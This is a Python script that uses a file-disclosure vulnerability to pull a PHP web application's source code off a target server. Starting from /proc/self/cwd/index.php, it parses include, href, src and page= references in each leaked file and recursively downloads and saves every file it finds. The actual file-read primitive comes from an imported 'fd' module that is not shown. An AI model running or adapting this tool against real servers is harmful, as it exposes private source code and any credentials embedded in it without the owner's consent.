import re
import logging
import os

def getLinks(html):
    output = set()
    links = re.findall(r"""(?:href=|src=|include )["']([0-9a-zA-Z\-_\/\.]*)[\?"']""", html)    
    for link in links:
        if not '.' in link:
            link += '/index.php'
        output.add(link)

    # Different regex, because if we just get a item with no extension, its a file.
    # Above, it it probably a directory.
    links = re.findall(r"""page=([0-9a-zA-Z-_\/\.]*)""", html)
    for link in links:
        if not '.' in link:
            link += '.php'
        output.add(link)

    return output


def saveFile(fullPath, content):
    directory = "output" + os.path.dirname(fullPath)
    if not os.path.exists(directory):
        os.makedirs(directory)
    with open("output" + fullPath, "w") as f:
        f.write(content)    
    
# ToDo: Automatically identify parent based upon webserver config
# func = a call to download src
def startCrawl(func, parent, file):    
    # Create our queue + previous work. Making them a set to prevent dups    
    crawled = set()
    queue = {file}

    while queue:
        # Get the item, then remove it from the queue
        page = queue.pop()
        print(f"Downloading page: {page}")
        crawled.add(page)
        # We are dealing with FileDisclosure, it's best to use the Absolute Path
        fullPath = parent + page
        output = func(fullPath)
        # ToDo: Probably need to check for 404 here
        saveFile(fullPath, output)
        links = getLinks(output)    
        for link in links:
            # Any link that begins with / or is .., can screw with our file write/dupe check
            link = link.lstrip("/")
            if "/" in page:
                    link = os.path.dirname(page) + "/" + link
            if link.endswith(".."):
                continue
            if link not in crawled:
                # This is new to us, add it to the queue                
                queue.add(link)
                logging.debug(f"Added {link} to queue")    

import fd
startCrawl(fd.downloadFile, "/proc/self/cwd/", "index.php")
